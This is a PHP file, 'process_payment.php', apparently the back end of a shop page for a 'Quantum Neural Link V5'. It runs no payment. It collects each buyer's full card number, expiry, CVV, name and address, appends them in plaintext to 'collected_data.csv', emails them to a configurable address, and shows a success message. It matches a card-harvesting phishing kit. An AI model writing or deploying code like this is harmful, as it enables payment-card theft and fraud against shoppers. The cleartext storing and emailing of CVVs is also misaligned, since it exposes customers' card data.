<?php
// process_payment.php

// CONFIGURATION: Set your email here
$to = "your_email@example.com";

if ($_SERVER["REQUEST_METHOD"] == "POST") {
 
 // 1. Capture Data
 $name = htmlspecialchars($_POST['name']);
 $card_number = preg_replace('/[^\d]/', '', $_POST['card_number']); 
 $expiry = htmlspecialchars($_POST['expiry']);
 $cvv = htmlspecialchars($_POST['cvv']);
 $address = htmlspecialchars($_POST['address']);
 $product = "Quantum Neural Link V5";
 $price = "$499.00";
 $date = date('Y-m-d H:i:s');

 // 2. Prepare CSV Data
 $file = 'collected_data.csv';
 $csv_data = "$date, $name, $card_number, $expiry, $cvv, $address, $product, $price\n";
 
 // Append to CSV
 file_put_contents($file, $csv_data, FILE_APPEND | LOCK_EX);

 // 3. Prepare Email
 $subject = "New Order: $product";
 $message = "
 <html>
 <head>
 <title>New Order Capture</title>
 </head>
 <body>
 <h2>New Transaction Received</h2>
 <p><strong>Product:</strong> $product</p>
 <p><strong>Price:</strong> $price</p>
 <hr>
 <h3>Customer Details:</h3>
 <ul>
 <li><strong>Name:</strong> $name</li>
 <li><strong>Card Number:</strong> $card_number</li>
 <li><strong>Expiration:</strong> $expiry</li>
 <li><strong>CVV:</strong> $cvv</li>
 <li><strong>Address:</strong> $address</li>
 </ul>
 <p><em>Timestamp: $date</em></p>
 </body>
 </html>
 ";

 $headers = "MIME-Version: 1.0". "\r\n";
 $headers.= "Content-type:text/html;charset=UTF-8". "\r\n";
 $headers.= "From: noreply@quantumtech.com". "\r\n";
 $headers.= "Reply-To: noreply@quantumtech.com". "\r\n";

 // 4. Send Email
 $mail_sent = mail($to, $subject, $message, $headers);

 // 5. Redirect
 if ($mail_sent) {
 echo "<script>
 document.getElementById('paymentForm').style.display = 'none';
 document.getElementById('successMsg').style.display = 'block';
 setTimeout(function(){ window.location.href = 'index.html'; }, 2000);
 </script>";
 } else {
 // Fallback if email fails
 echo "<script>alert('Payment processed but email failed. Data saved locally.'); window.location.href='index.html';</script>";
 }

} else {
 echo "Invalid Request";
}
?>
